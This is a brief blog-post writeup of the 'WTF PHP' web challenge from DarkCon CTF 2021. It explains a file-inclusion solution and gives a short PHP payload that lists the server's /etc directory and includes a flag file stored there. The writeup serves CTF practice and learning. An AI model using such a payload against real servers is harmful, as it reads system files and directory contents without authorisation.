---
layout: post
title:  "DarkCon CTF writeup (2021)"
date:   2021-02-21 15:11:51 +0530
categories: CTF web
---
This post has writeup for one web challenge: `WTF PHP`

This challenge has the local file inclusion (LFI) vulnerability. The solution is as follows:
1. Use opendir() and readdir() to list the contents of /etc directory.
2. Get the name of the txt file containing the flag (f1@g.txt).
3. Use the include directive to read the file. The code is as follows

{% highlight ruby %}
<?php
	include '/etc/f1@g.txt';	
	$filelist = array();
	if ($handle = opendir("/etc")) {
    	while ($entry = readdir($handle)) {
          	$filelist[] = $entry;
    	}
	print_r($filelist);
    closedir($handle);
	}
	 
?>
{% endhighlight %}
